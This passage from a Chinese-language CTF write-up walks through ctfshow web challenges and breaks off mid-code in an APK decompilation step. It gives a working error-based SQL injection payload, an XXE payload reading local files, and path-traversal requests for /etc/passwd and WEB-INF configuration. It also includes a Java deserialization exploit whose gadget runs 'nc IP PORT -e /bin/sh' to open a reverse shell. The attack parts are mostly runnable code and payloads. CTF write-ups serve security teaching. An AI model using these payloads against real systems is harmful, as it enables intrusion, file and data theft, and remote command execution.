<code>flag</code></p><pre class="line-numbers language-none"><code class="language-none">test' AND extractvalue(rand(),concat(0x3a,(SELECT flag from app_flag))) -- qwetest' AND extractvalue(rand(),concat(0x3a,mid((SELECT flag from app_flag),20))) -- qwe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>最后拼接一下获得 <code>ctfshow{e01fbb86-be44-486b-a829-8fdde99a5aca}</code></p><h2 id="6-web837"><a href="#6-web837" class="headerlink" title="6. web837"></a>6. web837</h2><p>XXE 任意文件读取</p><p>构造 Payload</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE data [&lt;!ENTITY file SYSTEM "file:///flag"&gt;]&gt;&lt;configs&gt;    &lt;config name="shutdown"&gt;        &lt;path&gt;/usr/local/null&lt;/path&gt;        &lt;execute&gt;shutdown.sh&lt;/execute&gt;        &lt;args&gt;&amp;file;&lt;/args&gt;    &lt;/config&gt;&lt;/configs&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../../../pic/image-20230122190417593.png"></p><p>访问主页获得 flag</p><p><img src="/../../../pic/image-20230122190519241.png"></p><h2 id="7-web838"><a href="#7-web838" class="headerlink" title="7. web838"></a>7. web838</h2><ul><li>题目描述</li></ul><blockquote><p>上传、下载是互联网两大基础功能，不久之前我们已经看到了恶意者如何用上传功能破坏你的系统。现在你会看到下载同样危机四伏。                </p><p>朋友，当你允许人们从你的网站下载东西的时候，请一定注意，有很多东西本不应该被外人触碰。            </p></blockquote><ul><li>题目解析</li></ul><p>点击页面上的附件下载</p><blockquote><p>税务系统长久以来主要使用的系统构建语言就是java，在多次通报的*友软件漏洞中，均提及了其原生反序列化漏洞。</p></blockquote><p>可以知道系统使用java进行搭建，且涉及到反序列化，既然没给源代码应该是要通过任意文件读取来获取页面源代码</p><p>测试下读取文件</p><pre class="line-numbers language-none"><code class="language-none">[GET]/file/download?file=../../../../../../etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/../../../pic/image-20230124114518280.png"></p><p>能够实现任意文件读取，接下来读取下网站的配置文件</p><pre class="line-numbers language-none"><code class="language-none">/file/download?file=../WEB-INF/web.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../pic/image-20230124115003572.png"></p><p>读取下 Servlet 的配置文件</p><pre class="line-numbers language-none"><code class="language-none">[GET]/file/download?file=../WEB-INF/dispatcher-servlet.xml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/../../../pic/image-20230124115130768.png"></p><p>得到控制器位置</p><pre class="line-numbers language-none"><code class="language-none">[GET]/file/download?file=../WEB-INF/classes/com/ctfshow/controller/IndexController.class<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>通过反编译获得控制器源码</p><ul><li>IndexController</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ctfshow<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>ctfshow<span class="token punctuation">.</span>entity<span class="token punctuation">.</span></span><span class="token class-name">User</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMethod</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ResponseBody</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Controller</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"/"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">IndexController</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token class-name">IndexController</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>        value <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"/"</span><span class="token punctuation">}</span><span class="token punctuation">,</span>        method <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token class-name">RequestMethod</span><span class="token punctuation">.</span><span class="token constant">GET</span><span class="token punctuation">}</span>    <span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"index"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>        value <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"/"</span><span class="token punctuation">}</span><span class="token punctuation">,</span>        method <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token class-name">RequestMethod</span><span class="token punctuation">.</span><span class="token constant">POST</span><span class="token punctuation">}</span>    <span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">User</span> user <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> userData <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"userData"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">ObjectInputStream</span> safeObjectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>userData<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            user <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">User</span><span class="token punctuation">)</span>safeObjectInputStream<span class="token punctuation">.</span><span class="token function">readUnshared</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> var5<span class="token punctuation">)</span> <span class="token punctuation">{</span>            var5<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token string">"User class can not unserialize"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var6<span class="token punctuation">)</span> <span class="token punctuation">{</span>            var6<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token string">"unserialize error"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token string">"unserialize done, you username is "</span> <span class="token operator">+</span> user<span class="token punctuation">.</span><span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>包含了 <code>com.ctfshow.entity.User</code>，顺便去读取一下</p><pre class="line-numbers language-none"><code class="language-none">[GET]/file/download?file=../WEB-INF/classes/com/ctfshow/entity/User.class<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>User</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ctfshow<span class="token punctuation">.</span>entity</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Serializable</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Objects</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> <span class="token number">1L</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> id<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> username<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> password<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> email<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> address<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>id<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setId</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>username<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setUsername</span><span class="token punctuation">(</span><span class="token class-name">String</span> username<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>username <span class="token operator">=</span> username<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getPassword</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>password<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setPassword</span><span class="token punctuation">(</span><span class="token class-name">String</span> password<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>password <span class="token operator">=</span> password<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">Object</span> o<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span> <span class="token operator">==</span> o<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>o <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> o<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token class-name">User</span> user <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">User</span><span class="token punctuation">)</span>o<span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token class-name">Objects</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>username<span class="token punctuation">,</span> user<span class="token punctuation">.</span>username<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token class-name">Objects</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>password<span class="token punctuation">,</span> user<span class="token punctuation">.</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token class-name">Objects</span><span class="token punctuation">.</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>id<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>username<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>password<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getEmail</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>email<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setEmail</span><span class="token punctuation">(</span><span class="token class-name">String</span> email<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>email <span class="token operator">=</span> email<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isNull</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">null</span> <span class="token operator">!=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>username <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>username<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">null</span> <span class="token operator">==</span> <span class="token keyword">this</span><span class="token punctuation">.</span>password <span class="token operator">||</span> <span class="token keyword">this</span><span class="token punctuation">.</span>password<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name">ObjectInputStream</span> input<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">{</span>        input<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>username<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>email<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>username<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>password<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>username<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 IndexController 中存在反序列化，在 User 下存在可利用方法</p><p>编写 Exp</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>ctfshow<span class="token punctuation">.</span>entity<span class="token punctuation">.</span></span><span class="token class-name">User</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">User</span> user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        user<span class="token punctuation">.</span><span class="token function">setUsername</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        user<span class="token punctuation">.</span><span class="token function">setPassword</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        user<span class="token punctuation">.</span><span class="token function">setEmail</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> address <span class="token operator">=</span> <span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        address<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        address<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span><span class="token string">"nc IP PORT -e /bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ByteArrayOutputStream</span> byteArrayOutputStream<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> encode <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>encode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获得反弹shell</p><p><img src="/../../../pic/image-20230124122609257.png"></p><h2 id="8-web839"><a href="#8-web839" class="headerlink" title="8. web839"></a>8. web839</h2><ul><li>题目描述</li></ul><p>很多人认为，APP的服务器只能被定制软件访问，不公开的地址、定制的软件、加密的协议、自创的算法，给了我们隐私私有、可控安全的虚妄想象。                </p><p>可是朋友，你是否想到，当你的APP被下载的那一刻起，它便可以被分析、被伪造、被利用。也即是从那一刻起，因隐蔽而带来的微薄保护便不复存在。                </p><p>所以，朋友，永远不要轻易相信来自互联网的任何一个字节，在这光速的海洋里，任何漏洞均会暴漏，任何接口均无可藏。            </p><ul><li>提示解析</li></ul><p>下载下来 apk 文件进行反编译</p><p>使用 <a href="https://ibotpeaches.github.io/Apktool/">apktool</a> 进行反编译</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">apktool d -s -f ctfer.apk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../pic/image-20230124132757052.png"></p><p>将其中的 dex 使用 <a href="https://github.com/DexPatcher/dex2jar">dex2jar</a> 编译为 jar</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">d2j-dex2jar.bat classes.dex<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>代码审计发现存在登录功能</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ctfshow<span class="token punctuation">.</span>ctferpro<span class="token punctuation">.</span>data</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>ctfshow<span class="token punctuation">.</span>ctferpro<span class="token punctuation">.</span>data<span class="token punctuation">.</span>model<span class="token punctuation">.</span></span><span class="token class-name">LoggedInUser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>ctfshow<span class="token punctuation">.</span>ctferpro<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">CryptoJS</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>charset<span class="token punctuation">.</span></span><span class="token class-name">StandardCharsets</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">UUID</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LoginDataSource</span> <span class="token punctuation">{</span>    <span class="token comment">// 认证接口</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> authURL <span class="token operator">=</span> <span class="token string">"http://www.xxxx.com/app/auth"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">LoginDataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token class-name">Result</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">LoggedInUser</span><span class="token punctuation">&gt;</span></span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">,</span> <span class="token 